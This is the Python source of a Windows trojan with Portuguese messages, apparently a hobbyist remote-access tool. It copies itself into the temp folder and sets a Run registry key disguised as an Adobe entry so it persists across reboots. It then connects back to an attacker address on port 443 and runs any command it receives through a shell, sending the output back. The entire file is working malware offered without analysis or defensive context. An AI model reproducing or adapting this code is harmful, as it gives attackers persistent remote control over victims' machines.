import socket
import sys
import time
import subprocess
import tempfile
import os

IP = '192.168.1.104'
PORT = 443
FILENAME = 'Trojan.exe'
TEMPDIR = tempfile.gettempdir()
DIRETORIO = os.path.dirname(os.path.abspath(__file__))

def autorun():
    try:
        os.system("copy " + FILENAME + " " + TEMPDIR)
    except:
        print 'Erro na copia'
        pass
    
    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                        " /v AdobeDoMal /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
    except:
        print 'Erro no registro'
        pass

def connect(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[!] Conexao Recebida\n')
        return s
    except Exception as e:
        print 'Erro de Conexao', e
        return None

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if data[:-1] == '/exit':
                s.close()
                sys.exit(0)
            else:
                cmd(s, data[:-1])
    except:
        error(s)

def cmd(s, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        s.send(saida+'\n')
    except:
        error(s)

def error(s):
    if s:
        s.close()
    main() 

def main():
    while True:
        s_conectado = connect(IP, PORT)    
        if s_conectado:
            listen(s_conectado)
        else:
            time.sleep(10)
            
if DIRETORIO.lower() != TEMPDIR.lower():
    autorun()
main()